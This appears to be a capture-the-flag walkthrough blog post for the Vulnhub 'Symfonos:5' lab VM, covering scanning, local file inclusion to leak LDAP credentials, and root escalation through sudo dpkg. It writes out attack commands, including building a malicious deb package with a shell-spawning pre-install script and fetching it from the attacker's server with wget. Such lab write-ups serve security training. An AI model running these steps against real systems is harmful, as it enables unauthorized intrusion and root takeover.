---
title: 'Symfonos:5 Vulnhub Walkthrough'
date: 2020-01-20T08:52:00+01:00
draft: false
---

This is another post on vulnhub CTF “named as “symfonos” by Zayotic. It is designed for VMware platform, and it is a boot to root challenge where you have to find flags to finish the task assigned by the author.

You can download it from here: **[https://www.vulnhub.com/entry/symfonos-5,415/](https://www.vulnhub.com/entry/symfonos-5,415/)**

Level: Intermediate

### **Penetrating Methodologies**

**Scanning**

*   Netdiscover
*   Nmap

**Enumeration**

*   Abusing HTTP
*   Dirb

**Exploiting LFI**

*   Burp suite

**Privilege Escalation**

*   Exploiting Dpkg

### Walkthrough

**Scanning**

Let’s start off with the scanning process. This target VM took the IP address of 192.168.0.112 automatically from our local wifi network.

Then we used Nmap for port enumeration. We found that port 22 for SSH, 80 for HTTP,389 and 636 for ldap are open.

```
nmap -A 192.168.0.112
```

![](https://i0.wp.com/1.bp.blogspot.com/-TdkXMmfwE2E/XiVV02hCETI/AAAAAAAAiP0/kicJhjHsFPMjX_0g-YR4C9sAQFUu-8egwCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### **Enumeration**

As port 80 is open, we tried to open the IP address in our browser, but we didn’t find anything useful on the webpage.

![](https://i2.wp.com/1.bp.blogspot.com/-kEXvy3xW2Xg/XiVV2PA-K1I/AAAAAAAAiQA/H7Y2CkVpbOUQoEjXi08cIWMVCt4Tbw9gACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Further, we use dirb for directory brute-forcing and found /admin.php page with status code 200 OK on executing following command.

```
dirb http://192.168.0.112
```

![](https://i2.wp.com/1.bp.blogspot.com/-eBcX3FU1xIE/XiVV2RvvZeI/AAAAAAAAiQE/ev79-magF5k1KEzycCfhfQGGyvJtVQXIACLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

When we searched the above-listed web page, i.e./admin.php; we got a login page, but we don’t know the login credential, so we try to bypass the login page by using the SQL injection and brute force attack, but unfortunately nothing was achieved.

![](https://i0.wp.com/1.bp.blogspot.com/-DHyRdnj6LD8/XiVV2eLtW3I/AAAAAAAAiQI/Bv_nKO5AHeUyi5oNGX6W6KYt4Kh2Cu4sgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Therefore, further, we use burpsuite and intercept the browser request of the current webpage for analyzing its request. We sent the request to the repeater and gently found a suspicious hyperlink inside its burp response.

We feel there are possibilities of LFI just because the URL is connecting with localhost for portraits.php file as shown in the given image.

![](https://i0.wp.com/1.bp.blogspot.com/-CzAWXDX5K3M/XiVV3WySKFI/AAAAAAAAiQM/a3SogccoEbs7Oqcfyt8fGUds5sePpWgwgCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

To ensure the possibility of LFI vulnerability we try to pull “/etc/passwd” file by fuzzing the parameter “/home.php?url=” and it works successfully as expected to be.

![](https://i2.wp.com/1.bp.blogspot.com/-_GY908ixu_E/XiVV3f9RYYI/AAAAAAAAiQQ/ZGXJj7MLVfgnliYUEbPqp3uA_AZZgjRfQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

### **Exploit LFI**

As a result we successfully got the content of “admin.php” file by exploiting LFI by fuzzing the same parameter. As we knew the https://ift.tt/378Yh2I webpage requires login credential and here we found credential “username: admin” and “password: qMDdyZh3cT6eeAWD” which is actually used to connect with LDAP.

![](https://i2.wp.com/1.bp.blogspot.com/-DRmpIoncbZw/XiVV3vK12XI/AAAAAAAAiQU/mKezrYpfvYYW8Floi9dYGYD50As22SfMQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

Further, we used nmap for LDAP enumeration and run following command, and as a result we found user information including password.

```
nmap 192.168.0.112 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
``````
zeus  
cetkKf4wCuHC9FET
```

![](https://i1.wp.com/1.bp.blogspot.com/-UNiB6OmFcT0/XiVV03AZ_YI/AAAAAAAAiPw/og2fn8pCE6omR_ZvuzXnrwJyu7u8jorxgCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

### **Privilege Escalation**

Thus, we used the user zeus credential as enumerated above to access the ssh shell of the host machine and check sudo rights for him. We found zeus has sudo permission to run dpkg as root thus we abuse zeus sudo rights for privilege escalation by exploiting dpkg functionality.

![](https://i2.wp.com/1.bp.blogspot.com/-LeG7XwJtaHc/XiVV0zK8UrI/AAAAAAAAiPs/4vU6g1MLWOsS6O0kF8qe32XjLiAzEUsxACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

As we Dpkg is package installer just like apt in Linux like operating system and so here we are going to craft a Debian package with the help fpm transfer on the host machine to get the privilege shell.

```
mkdir ignite  
cd ignite  
nano shell.sh
```

write following code in the shell.sh file and save it.

```
 #!/bin/bash  
/bin/bash
```

Install fpm in your local machine and run following command to generate a Debian package for shell.sh file.

```
fpm -s dir -t deb -n exploit –before-install shell.sh ./  
ls  
python -m SimpleHTTPServer
```

**_Note: You will need to install FPM on your machine._**

![](https://i0.wp.com/1.bp.blogspot.com/-a7twLDgvUNA/XiVV1sNGzWI/AAAAAAAAiP4/_8XiGuU42e0FiAVrQb0dftQ8iyuSjsjsgCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

Once the malicious deb package gets generated download it on the host machine and install the package as root. To perform privilege escalation run the following command and you get privilege where you found the proof.txt as shown in the given image.

```
wget http://192.168.0.114:8000/exploit\_1.0\_amd64.deb  
sudo -u root /usr/bin/dpkg -i exploit\_1.0\_amd64.deb  
id  
cd /root  
cat proof.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-unTUJrRGaE4/XiVV13pn20I/AAAAAAAAiP8/eIGXkp0nERUyFI1cNgNm-U21jtnNEnb0QCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

**Author**: Pinky Deka is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/pinky-deka/)

The post [Symfonos:5 Vulnhub Walkthrough](https://www.hackingarticles.in/symfonos5-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/38mGnd1